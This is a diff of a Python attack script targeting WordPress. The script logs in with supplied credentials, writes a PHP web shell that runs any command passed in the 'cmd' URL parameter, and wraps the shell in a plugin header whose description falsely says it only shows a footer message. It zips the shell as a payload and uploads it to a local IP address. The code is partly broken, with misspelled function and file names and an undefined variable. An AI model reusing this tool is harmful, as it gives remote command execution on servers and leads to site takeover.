@@ -3,7 +3,7 @@ import zipfile
 
 
 def login(user, password, url):
-    urll = f'{url}wp-login.php'
+    urll = f'{url}/wp-login.php'
     data = {
         'log': user,
         'pwd': password,
@@ -20,28 +20,36 @@ def login(user, password, url):
 
 def gen_plugin(): 
     php_code = """<?php
-if(isset($_GET['cmd']))
-{
-    system($_GET['cmd']);
-}
-?>"""
+/**
+ * Plugin Name: RCE
+ * Description: Un plugin simple pour afficher un message dans le pied de page.
+ * Version: 1.0
+ * Author: TFA
+ */
+    if(isset($_GET['cmd']))
+    {
+        system($_GET['cmd']);
+    }
+?>
+"""
     with open("plugins.php", "w") as php_file:
         php_file.write(php_code)
-        print('[*] genereta plugins...')
+
     zip = 'payload.zip'
 
     with zipfile.ZipFile(zip, 'w') as zip_file:
         zip_file.write("plugins.php")
-        print('[+] plugins was generate.')
     
     return(f'[+] payload name: {zip}')
-
-print(gen_plugins())
 
 
 #user = input('enter wp user: ')
 #password = input('enter wp pass: ')
 #url = input('enter wp url: ')
-#login_wp = login(user, password, url) 
-#print(login_wp)
+
+print(login_wp)
+gen = gen_plugin()
+print(gen)
+upload = uplaod_plugins('http://192.168.5.45/', 'paylaod.zip')
+print(upload)
 
